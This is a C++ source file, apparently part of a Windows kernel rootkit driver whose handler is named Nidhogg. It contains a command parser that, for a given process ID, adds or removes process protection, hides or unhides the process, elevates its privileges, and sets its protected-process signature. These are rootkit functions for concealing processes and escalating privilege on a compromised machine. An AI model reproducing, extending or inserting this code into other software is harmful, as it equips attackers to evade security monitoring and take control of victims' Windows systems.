#include "pch.h"
#include "ProcessParser.h"
#include "ProcessHandler.h"

ProcessParser::ProcessParser() {
	this->optionsSize = 7;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Add, { 1, { ArgType::ULong } } };
	this->options[1] = { Options::Remove, { 1, { ArgType::ULong } } };
	this->options[2] = { Options::Clear, { 0, {} } };
	this->options[3] = { Options::Hide, { 1, { ArgType::ULong } } };
	this->options[4] = { Options::Unhide, { 1, { ArgType::ULong } } };
	this->options[5] = { Options::Elevate, { 1, { ArgType::ULong } } };
	this->options[6] = { Options::Signature, { 3, { ArgType::ULong, ArgType::ULong,
		ArgType::ULong } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	ProcessSignature signature{};
	NTSTATUS status = STATUS_SUCCESS;
	ULONG pid = 0;

	if (commandId != Options::Clear) {
		pid = *(ULONG*)args[0];

		if (!IsValidPid(pid))
			return STATUS_INVALID_PARAMETER;
	}

	switch (commandId) {
	case Options::Add:
	{
		if (!Features.ProcessProtection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		
		if (NidhoggProcessHandler->GetProtectedProcessesCount() == MAX_PIDS) {
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (NidhoggProcessHandler->FindProcess(pid))
			break;

		if (!NidhoggProcessHandler->AddProcess(pid))
			status = STATUS_UNSUCCESSFUL;
		break;
	}
	case Options::Remove:
	{
		if (!Features.ProcessProtection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (NidhoggProcessHandler->GetProtectedProcessesCount() == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (!NidhoggProcessHandler->RemoveProcess(pid))
			status = STATUS_NOT_FOUND;

		break;
	}
	case Options::Clear:
	{
		NidhoggProcessHandler->ClearProtectedProcesses();
		break;
	}
	case Options::Hide:
	{
		status = NidhoggProcessHandler->HideProcess(pid);
		break;
	}
	case Options::Unhide:
	{
		status = NidhoggProcessHandler->UnhideProcess(pid);
		break;
	}
	case Options::Elevate:
	{
		status = NidhoggProcessHandler->ElevateProcess(pid);
		break;
	}
	case Options::Signature:
	{
		signature.Pid = pid;
		signature.SignerType = *(UCHAR*)args[1];
		signature.SignatureSigner = *(UCHAR*)args[2];

		if ((signature.SignatureSigner < PsProtectedSignerNone || signature.SignatureSigner > PsProtectedSignerMax) ||
			(signature.SignerType < PsProtectedTypeNone || signature.SignerType > PsProtectedTypeProtected)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggProcessHandler->SetProcessSignature(&signature);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}
